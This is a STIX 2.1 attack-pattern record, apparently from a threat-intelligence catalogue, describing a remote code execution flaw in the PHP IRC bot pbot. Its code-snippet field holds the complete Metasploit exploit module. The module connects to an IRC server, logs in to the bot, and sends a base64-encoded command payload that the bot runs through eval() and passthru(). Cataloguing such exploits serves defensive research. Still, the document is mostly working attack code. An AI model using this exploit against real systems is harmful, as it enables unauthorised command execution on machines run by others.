{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2190bc81-deda-4f1e-9379-f0b3e71e4542",
    "created": "2024-08-14T17:06:54.325867Z",
    "modified": "2024-08-14T17:06:54.325871Z",
    "name": "PHP IRC Bot pbot eval() Remote Code Execution",
    "description": " This module allows remote command execution on the PHP IRC bot pbot by abusing the usage of eval() in the implementation of the .php command. In order to work the data to connect to the IRC server and channel where find pbot must be provided. The module has been successfully tested on the version of pbot analyzed by Jay Turla, and published on Infosec Institute, running over Ubuntu 10.04 and Windows XP SP3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/pbot_exec.rb",
            "external_id": "pbot_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://resources.infosecinstitute.com/pbot-analysis/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PHP IRC Bot pbot eval() Remote Code Execution',\n      'Description'    => %q{\n          This module allows remote command execution on the PHP IRC bot pbot by abusing\n        the usage of eval() in the implementation of the .php command. In order to work,\n        the data to connect to the IRC server and channel where find pbot must be provided.\n        The module has been successfully tested on the version of pbot analyzed by Jay\n        Turla, and published on Infosec Institute, running over Ubuntu 10.04 and Windows XP\n        SP3.\n        },\n      'Author'         =>\n        [\n          'evilcry', # pbot analysis'\n          'Jay Turla', # pbot analysis\n          'bwall', # aka @bwallHatesTwits, PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '84913' ],\n          [ 'EDB', '20168' ],\n          [ 'URL', 'http://resources.infosecinstitute.com/pbot-analysis/']\n        ],\n      'Platform'       => %w{ unix win },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'    => 344, # According to RFC 2812, the max length message is 512, including the cr-lf\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n            }\n        },\n      'Targets'  =>\n        [\n          [ 'pbot', { } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-11-02',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(6667),\n        OptString.new('IRC_PASSWORD', [false, 'IRC Connection Password', '']),\n        OptString.new('NICK', [true, 'IRC Nickname', 'msf_user']),\n        OptString.new('CHANNEL', [true, 'IRC Channel', '#channel']),\n        OptString.new('PBOT_PASSWORD', [false, 'pbot Password', ''])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    connect\n\n    response = register(sock)\n    if response =~ /463/ or response =~ /464/\n      vprint_error(\"#{rhost}:#{rport} - Connection to the IRC Server not allowed\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    response = join(sock)\n    if not response =~ /353/ and not response =~ /366/\n      vprint_error(\"#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel\")\n      return Exploit::CheckCode::Unknown\n    end\n    response = pbot_login(sock)\n    quit(sock)\n    disconnect\n\n    if response =~ /auth/ and response =~ /logged in/\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def send_msg(sock, data)\n    sock.put(data)\n    data = \"\"\n    begin\n      read_data = sock.get_once(-1, 1)\n      while not read_data.nil?\n        data << read_data\n        read_data = sock.get_once(-1, 1)\n      end\n    rescue EOFError\n    end\n    data\n  end\n\n  def register(sock)\n    msg = \"\"\n\n    if datastore['IRC_PASSWORD'] and not datastore['IRC_PASSWORD'].empty?\n      msg << \"PASS #{datastore['IRC_PASSWORD']}\\r\\n\"\n    end\n\n    if datastore['NICK'].length > 9\n      nick = rand_text_alpha(9)\n      print_error(\"The nick is longer than 9 characters, using #{nick}\")\n    else\n      nick = datastore['NICK']\n    end\n\n    msg << \"NICK #{nick}\\r\\n\"\n    msg << \"USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\\r\\n\"\n\n    response = send_msg(sock,msg)\n    return response\n  end\n\n  def join(sock)\n    join_msg = \"JOIN #{datastore['CHANNEL']}\\r\\n\"\n    response = send_msg(sock, join_msg)\n    return response\n  end\n\n  def pbot_login(sock)\n    login_msg = \"PRIVMSG #{datastore['CHANNEL']} :.login\"\n    if datastore['PBOT_PASSWORD'] and not datastore['PBOT_PASSWORD'].empty?\n      login_msg << \" #{datastore['PBOT_PASSWORD']}\"\n    end\n    login_msg << \"\\r\\n\"\n    response = send_msg(sock, login_msg)\n    return response\n  end\n\n  def pbot_command(sock)\n    encoded = Rex::Text.encode_base64(payload.encoded)\n    command_msg = \"PRIVMSG #{datastore['CHANNEL']} :.php #{rand_text_alpha(1)} passthru(base64_decode(\\\"#{encoded}\\\"));\\r\\n\"\n    response = send_msg(sock, command_msg)\n    return response\n  end\n\n  def quit(sock)\n    quit_msg = \"QUIT :bye bye\\r\\n\"\n    sock.put(quit_msg)\n  end\n\n  def exploit\n    connect\n\n    print_status(\"#{rhost}:#{rport} - Registering with the IRC Server...\")\n    response = register(sock)\n    if response =~ /463/ or response =~ /464/\n      print_error(\"#{rhost}:#{rport} - Connection to the IRC Server not allowed\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Joining the #{datastore['CHANNEL']} channel...\")\n    response = join(sock)\n    if not response =~ /353/ and not response =~ /366/\n      print_error(\"#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Registering with the pbot...\")\n    response = pbot_login(sock)\n    if not response =~ /auth/ or not response =~ /logged in/\n      print_error(\"#{rhost}:#{rport} - Error registering with the pbot\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Exploiting the pbot...\")\n    pbot_command(sock)\n\n    quit(sock)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-02",
    "x_mitre_platforms": [
        "%w{ unix win }"
    ]
}